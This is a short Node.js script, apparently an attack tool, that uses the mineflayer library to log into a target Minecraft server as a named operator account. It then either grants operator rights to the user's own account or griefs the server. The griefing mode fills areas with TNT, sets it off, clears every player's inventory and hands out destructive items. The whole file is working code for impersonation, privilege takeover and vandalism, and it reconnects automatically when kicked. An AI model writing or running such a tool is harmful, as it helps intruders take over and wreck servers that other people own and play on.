const mineflayer = require('mineflayer')
const prompt = require("prompt-sync")();




Main()
async function Main(){

const ip = prompt("Target IP: ");

const opname = prompt("OP username (a player's name of who has op permission): ")

const select = prompt("What do you prefer, Grant yourself op (type 1) OR Grief the server (type 2): ")

let yourname = ''

if(select === "1"){
  yourname = prompt("Your account username: ")
}


Login(ip, opname, select, yourname)





}


async function Login(ip, opname, select, yourname){
  const bot = mineflayer.createBot({
    host: ip,
    username: opname,
  });
  
  bot.once('spawn', m=>{
  
    if(select === "1"){
      bot.chat("/op " + yourname)
      console.log('OP granted for ' + yourname)
    } 
    if(select === "2"){
  
      bot.chat("/fill ~ ~ ~ ~50 ~20 ~29 minecraft:tnt")
      bot.chat('/fill ~ ~ ~ ~3 ~3 ~3 minecraft:redstone_block')
      bot.chat('/gamemode creative @a')
      bot.chat('/tp @a @p')
      bot.chat('/clear @a') 
      bot.chat('/give @a minecraft:flint_and_steel')
      bot.chat('/give @a minecraft:tnt')
      bot.chat('/give @a minecraft:lava_bucket')
      console.log('Griefed!')
    }
  
  })
  
  bot.once('kicked', reason =>{
    console.log('bot was kicked, reason: ' + reason + '\ntrying to reconnect')
    Login(ip, opname, select, yourname)
  })
}
